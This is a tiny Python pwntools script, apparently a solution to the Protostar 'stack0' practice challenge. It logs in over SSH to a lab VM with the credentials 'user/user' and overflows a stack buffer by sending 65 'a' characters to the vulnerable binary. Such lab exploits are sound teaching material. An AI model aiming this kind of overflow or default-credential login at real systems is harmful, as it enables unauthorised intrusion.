#coding:utf-8

import pwn
pwn.context(arch="i386", os="linux")

remote = pwn.ssh("user", "192.168.0.10", password="user") #Bien évidement changer 192.168.0.10 par l'ip de la machine protostar

exploit = remote.run("/opt/protostar/bin/stack0")
exploit.sendline("a"*65)

pwn.log.info("Success ! ")
